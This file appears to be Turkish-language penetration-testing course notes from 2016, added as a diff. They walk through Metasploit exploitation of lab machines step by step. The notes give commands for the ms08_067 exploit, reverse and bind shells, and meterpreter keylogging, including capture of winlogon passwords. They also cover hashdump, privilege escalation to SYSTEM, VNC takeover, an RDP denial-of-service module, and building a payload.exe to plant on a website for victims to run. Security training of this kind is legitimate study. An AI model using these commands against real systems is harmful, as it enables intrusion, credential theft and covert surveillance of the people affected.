@@ -1,0 +1,234 @@
+---14/08/2016
+
+---Exploit: 
+
+-Kavramlar: exploit için gerekenler: Vulnerability (Zafiyet), zafiyeti sömürme işlemi: exploit, exploit işleminden sonra yapılabilecekler: payload.
+
+-Stage Payload: Payload bazen yeterli yer olmadığı için tek seferde gönderilemeyebilir. Bu durumlarda payload'ın parça parça gönderilmesine "stage payload" denir. 
+
+-Framework (Geliştirme Çatısı): Bulunan zafiyetlerin exploit kısmını çeşitli payload'lar ile birlikte modüler bir şekilde düzenler. 
+
+---Mola 15dk---
+
+-İnternetten python ile yazılmış bir exploit bularak kullanma örneği:
+
+=> python /mnt/hgfs/Downloads/7132.py 172.16.193.149 2 (exploit'i yolladığımız kod)
+=> nc 172.16.193.149 4444 (exploit edilen makineye girmek için kullandığımız kod)
+
+-Payload'dan çıkıp, tekrar exploit ettiğimiz zaman makine crash oluyor ve payload bu sefer düzgün çalışmıyor. Makine reset attığında tekrar çalışır.
+
+-Metasploit Framework: Şu anda Ruby ile geliştirilen framework. Çeşitli exploit ve payload'ların bulunduğu, bu exploit ve payload'lara kolaylıkla erişilebilmemizi ve bunları modüler bir şekilde kullanmamızı sağlayan framework. Eğer çalışan ve database'de olmayan bir exploit yazabilirsek, framework'e eklenebilir. Sadece exploit'i yapmamız yeterli olacaktır. Payload'lar zaten framework bünyesinde bulunmaktadır.
+
+-HdMoore: Metasploit Framework geliştiricisi.
+
+-Metasploit Framework içerisinde bulunan bölümler:
+
+-Auxiliary (yardımcı tool'ların bulunduğu bölüm)
+-Exploit
+-Payload
+-Post-exploitation: (Exploit sonrası kullanılabilecek yardımcı tool'ların bulunduğu bölüm)
+-Encoders (Payload olarak gönderdiğimiz kodları herhangi bir güvenlik çözümüne karşı görülmemesi için imzalarını değiştiren bölüm)
+
+-Metasploit Framework Arayüzleri:
+
+-CLI (Command Line Interface)
+-WEB
+-RPC
+
+-Kullanacağımız arayüz: CLI 
+
+***Notlarda kullanılan gösterim: => normal terminal, ~> metasploit-framework(MSF), ~~> MSF modül, >> Ele geçirilen makine, M> meterpreter konsolu, E> Hedefin ekranı, P~> post-exploitation, A~> Auxiliary modülü, 
+
+=> msfconsole
+~> banner: (random seçilen bir açılış ekranı. alt kısmında tool'da bulunan exploit, payload sayısı vb. bilgiler verir)
+~> help: Modülsüz haldeki kullanabileceğimiz temel komutları listeler.
+~> advanced: Kullanılan modül hakkında daha fazla bilgi almamızı sağlayan komut.
+~> back: Modüller arası geçişte geri dönmek için kullandığımız komut.
+-Metasploit konsolu aynı zamanda terminal'de desteklenen komutları da çalıştırır. (Örnek: ls, pwd, ifconfig vb...)
+~> connect: Başka bir host ile msf konsolunu birbirine bağlar, diğer host'un aldığı sonuçları bizim konsolumuzda da bu sayede görebiliriz.
+~> info: Basit yardım.
+~> irb: Exploit'in kaynak kodunu açıp editleyebilmemizi sağlar.
+~> jobs: Bazı exploit'lerin çalışması için bazı servisleri ayağa kaldırıyoruz. bu servislerin yönetimini jobs komutu ile yapıyoruz.
+~> load: Plugin yüklememizi sağlayan komut.
+~> options: framework içerisinde global değişken oluşturabilmemizi sağlayan komut.
+~> route: Ele geçirilen makinenin arkasındaki makinelere ulaşmak için, ele geçirilen makineyi router gibi kullanmamızı sağlayan komut.(Pivoting)
+~> search: Modülleri aramamızı sağlar.
+~> sessions: Açılan shell'ler arası geçiş yapabilmemizi ve bu oturumları görebilmemizi sağlayan komut.
+
+-MSF üzerinden örnek:
+~> search ms08-067
+~> use exploit/windows/smb/ms08_067_netapi
+~~> show
+~~> show options
+~~> set RHOST 172.16.193.149
+~~> show options
+~~> show payloads
+~~> show targets
+~~> set PAYLOAD windows/shell/bind_tcp
+~~> show options 
+~~> set LPORT 1984
+~~> show options
+~~> check
+~~> exploit
+>> ctrl+z (session'u arkaplana atar ve msf'ye geri döner)
+~~> sessions
+~~> sessions -i 1
+>> ctrl+c (session'u abort eder)
+~~> exploit
+>> (Exploit makineye restart atmadan tekrar çalıştırılabildi. Bunun sebebi kullandığımız exploit ve payload'ın stabil olarak çalışıyor olması.)
+
+---Mola 1.5saat---
+
+-Sistemin exploit göndereceğimiz port'una erişiyor olabiliriz. Ancak başka bir port'a bağlanamayabiliriz. Bu durumda sistemi exploit etmiş oluruz ancak payload'dan yararlanamayız. MSF'nin sunduğu reverse shell seçeneği bu durum için bir çözüm sunar. Sistemin bize bağlantı kurma isteği yollamasını sağlar.
+
+~~> set PAYLOAD windows/shell/reverse_tcp
+~~> show options
+~~> set LHOST 172.16.193.151 (kendi IP adresimiz)
+~~> set LPORT 443 (boşta olan herhangi bir port)
+~~> show options
+~~> exploit
+>> ^C (ctrl+c abort session)
+
+~~> set PAYLOAD windows/messagebox/
+~~> show options
+~~> set ICON INFORMATION
+~~> set TEXT POwned you
+~~> set TITLE Hacker!
+~~> show options
+~~> exploit
+
+~~> set PAYLOAD windows/exec/
+~~> show options
+~~> set CMD cmd.exe /c "mkdir c:\\Docume~1\\Administrator.Ambush\\Desktop\\Hacked"
+~~> exploit
+
+--- Mola 15dk---
+
+~~> set PAYLOAD windows/meterpreter/reverse_tcp
+~~> show options
+~~> set LHOST 172.16.193.151
+~~> exploit
+M> help
+M> pwd
+M> cd "C:\\Docume~1"
+M> pwd
+M> ls
+M> mkdir meterpreter
+M> rmdir meterpreter
+M> download password.txt (bulunduğu dizindeki password.txt dosyasını indirir)
+M> screenshot (girdiğimiz sistemin ekran görüntüsünü alır)
+M> upload (dosya upload edebiliriz)
+M> shell (komut satırına geçiş yapar)
+>> ctrl+z (komut sistemini arka plana atıp meterpreter'e geri dönüş yapar)
+M> channel -l (açılan kanalları görüntüler)
+M> channel -i 2 (kanala geçiş yapar)
+>> exit (shell oturumunu kapatır, meterpreter'e döner)
+M> ps (process'leri görüntüler)
+M> kill 3512 (ID'si 3512 olan process'i sonlandırır)
+M> sysinfo (sistemle ilgili özet bilgi verir)
+M> getuid (mevcut kullanıcı adını döndürür)
+M> getprivs (yetkilerimizi listeler)
+
+--- Meterpreter kendini gizleme özelliği:
+
+-Sömürdüğümüz process'in sahibinin yetki seviyesine sahip oluruz. Bizden düşük yetkide bir işleme geçiş yapabiliriz ancak bizden yüksek yetkide bir process'e geçiş yapamayız. Bizden düşük yetkide bir işleme eğer Admin yetkisinden geçersek, admin yetkisine bir daha geri dönemeyebiliriz.
+
+M> ps
+M> migrate 3792 (3792 ID'li process'e geçiş yapar, eğer 3792 sonlandırılırsa session kapanır.)
+~~> exploit
+M> getpid (şu anda sömürmekte olduğumuz process ID'sini döner.)
+M> arp (arp tablosunu görüntüler)
+M> route (route tablosunu görüntüler)
+M> migrate 2968 (explorer.exe)
+M> keyscan_start (çalışması için sömürdüğümüz process'in tuşları kaydeden bir process olması gerek, örnek: explorer.exe)
+M> keyscan_dump (basılan tuşları görüntüler)
+M> migrate 432 (ekran kilitliyken girilen şifreleri alabilmek için winlogon.exe process'ine geçiş yapmamız gerekir)
+M> keyscan_start
+M> keyscan_dump
+M> keyscan_stop
+M> idletime (klavye ve mouse'nin kullanılmadığı süre. bu süreye bakılarak kişinin bilgisayar başında olup olmadığı anlaşılabilir)
+M> migrate 3268 (admin kullanıcısının sahip olduğu bir process)
+M> getuid (Cevap: Server username: AMBUSH\Administrator)
+M> getsystem (sahip olduğumuzdan daha yüksek, elde edebileceğimiz yetkileri ele geçirmeye çalışır)
+M> getuid (Cevap: Server username: NT AUTHORITY\SYSTEM (a.k.a root))
+M> hashdump (Gerekenler: sistem yetkisi. Sistemdeki parola hashtag'lerini elde etmemizi sağlar)
+M> reg (kayıt dosyalarına erişim ve müdahale etme imkanı tanır.)
+M> exit
+
+~~> set PAYLOAD windows/vncinject/reverse_tcp
+~~> show options 
+~~> set ViewOnly false (false değeri ekranı kontrol edebilme yetkisi verir, true değeri sadece izleme modunda açar)
+~~> exploit
+E> (Hedefin ekranına girer ve ekranı kontrol edebilir)
+
+---Post-Exploitation:
+
+~~> set PAYLOAD windows/meterpreter/reverse_tcp
+~~> exploit
+M> background
+~~> show post (kullanabileceğimiz post-exploitation'ları görüntüler)
+~~> use post/windows/gather/checkvm
+P~> show options
+P~> sessions
+P~> set SESSION 10
+P~> exploit
+P~> search virtualbox
+P~> sessions -i 10
+M> run checkvm (run: post-exploitation modüllerini meterpreter içerisinde kullanmamızı sağlar)
+
+---Auxiliary:
+
+-DOS'a sebebiyet veren modüller auxiliary dizininde yer alır.
+
+P~> show auxiliary
+P~> search snmp
+P~> use auxiliary/scanner/snmp/sbg6580_enum
+A~> show options
+A~> set RHOSTS 172.16.193.158
+A~> exploit
+
+A~> use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+A~> show options
+A~> set RHOST 172.16.193.149 
+A~> check
+A~> exploit
+---windows iptal---
+
+A~> use payload/windows/meterpreter/reverse_tcp
+M> show options
+M> set LHOST 172.16.193.151
+M> generate (mevcut payload'ları çalıştırılabilir dosya haline dönüştürür)
+M> generate -t exe -f payload.exe (payload'ı bulunduğumuz dizine payload.exe olarak çıkartır)
+-payload.exe bir web sitesine yüklenir. Hedef siteye girip payload.exe'yi indirip çalıştırırsa yine exploit ile elde edeceğimiz etkiyi elde ederiz. Gelen payload'ı dinleyebilmek için:
+M> use exploit/multi/handler 
+~~> show options
+~~> set LHOST 172.16.193.151
+~~> set LPORT 4444
+~~> run
+M> (meterpreter konsolu açılır)
+M> portfwd add -l 2222 -r 192.168.0.1 -p 80 (hedef sisteme route tanımı girer)
+M> portfwd delete -l 2222
+M> shell
+>> edit
+>> ipconfig
+>> mkdir test
+>> ^Z
+M> shell
+>> 
+
+--- Mola 1.5saat---
+
+---192.168.20.3(linux), 192.168.20.12(windows) makinelere sızma ödevi.
+
+---LINUX(192.168.20.3):
+-ProFTPD Server SQL Injection Vulnerability 
+-distcc Remote Code Execution Vulnerability
+-Check for Backdoor in unrealircd
+-vsftpd Compromised Source Packages Backdoor Vulnerability
+-PostgreSQL Multiple Security Vulnerabilities 
+-TikiWiki Versions Prior to 4.2 Multiple Unspecified Vulnerabilities | use exploit/unix/webapp/tikiwiki_graph_formula_exec
+
+---WINDOWS(192.168.20.12):
+-use exploit/windows/smb/ms08_067
+-XAMPP WebDAV PHP Upload Vulnerability
+-Apache Tomcat Windows Installer Privilege Escalation Vulnerability
